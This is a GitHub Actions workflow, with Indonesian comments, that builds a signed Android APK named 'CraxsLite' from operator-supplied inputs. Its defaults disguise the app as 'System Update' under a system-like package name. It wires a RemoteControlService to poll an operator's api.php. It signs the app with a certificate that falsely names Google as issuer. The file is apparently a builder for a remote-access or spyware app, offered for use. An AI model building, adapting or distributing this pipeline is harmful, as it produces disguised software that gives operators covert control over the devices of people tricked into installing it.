name: CraxsLite Dynamic Builder

on:
  workflow_dispatch:
    inputs:
      URL:
        description: 'URL Dashboard (index.php)'
        required: true
        default: 'https://yourdomain.com/index.php'
      PACKAGE_NAME:
        description: 'Package Name (Gunakan format: com.internal.service)'
        required: true
        default: 'com.android.system.service'
      APP_NAME: 
        description: 'Nama Aplikasi yang Terinstall'
        required: true
        default: 'System Update'
      ICON_URL: 
        description: 'URL Ikon PNG (Direct Link)'
        required: true
        default: 'https://cdn-icons-png.flaticon.com/512/888/888841.png'
      KEY_PASS:
        description: 'Password Keystore'
        required: true
        default: 'android'

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout Repository
      uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'
        cache: gradle

    - name: Setup Android SDK
      uses: android-actions/setup-android@v3 

    - name: Install ImageMagick
      run: sudo apt-get install -y imagemagick

    - name: Make Gradlew Executable
      run: chmod +x gradlew

    - name: Sync Package Name & Configs
      run: |
        NEW_PKG="${{ github.event.inputs.PACKAGE_NAME }}"
        APP_URL="${{ github.event.inputs.URL }}"
        API_URL="${APP_URL%/*}/api.php"
        
        echo "Updating Package Name to: $NEW_PKG"
        # Update applicationId di build.gradle
        sed -i "s/applicationId \".*\"/applicationId \"$NEW_PKG\"/g" app/build.gradle
        
        # Update package di semua file Java (Penting agar tidak error)
        OLD_PKG="com.tufanakcay.androidwebview"
        find app/src/main/java -name "*.java" -exec sed -i "s/package $OLD_PKG;/package $NEW_PKG;/g" {} +
        
        # Update Nama Aplikasi & URL di strings.xml
        sed -i "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">${{ github.event.inputs.APP_NAME }}</string>|g" app/src/main/res/values/strings.xml
        sed -i "s|<string name=\"web_url\">.*</string>|<string name=\"web_url\">$APP_URL</string>|g" app/src/main/res/values/strings.xml
        
        # Update URL API di RemoteControlService.java untuk Polling
        sed -i "s|private String apiUrl = \".*\";|private String apiUrl = \"$API_URL\";|g" app/src/main/java/com/tufanakcay/androidwebview/RemoteControlService.java

    - name: Clean Junk & Prepare Icons
      run: |
        rm -rf app/src/main/res/mipmap-*/*
        mkdir -p app/src/main/res/mipmap-xxhdpi
        
        # Download Ikon
        curl -L "${{ github.event.inputs.ICON_URL }}" -o /tmp/icon.png
        
        # Konversi ke format yang benar untuk Android (96x96 px)
        convert /tmp/icon.png -resize 96x96! app/src/main/res/mipmap-xxhdpi/ic_launcher.png
        convert /tmp/icon.png -resize 96x96! app/src/main/res/mipmap-xxhdpi/ic_launcher_round.png

    - name: Generate Fresh Keystore
      run: |
        keytool -genkey -v -keystore app/release-key.jks \
        -alias "craxslite" \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -storepass ${{ github.event.inputs.KEY_PASS }} \
        -keypass ${{ github.event.inputs.KEY_PASS }} \
        -dname "CN=Android, OU=Google, O=Android, L=Mountain View, S=CA, C=US"
        
        # Buat file properties untuk Gradle
        echo "storeFile=release-key.jks" > release.properties
        echo "keyAlias=craxslite" >> release.properties
        echo "keyPassword=${{ github.event.inputs.KEY_PASS }}" >> release.properties
        echo "storePassword=${{ github.event.inputs.KEY_PASS }}" >> release.properties

    - name: Build Signed APK
      run: ./gradlew clean assembleRelease --stacktrace

    - name: Upload APK Result
      uses: actions/upload-artifact@v4
      with:
        name: CraxsLite-Built-APK
        path: app/build/outputs/apk/release/app-release.apk
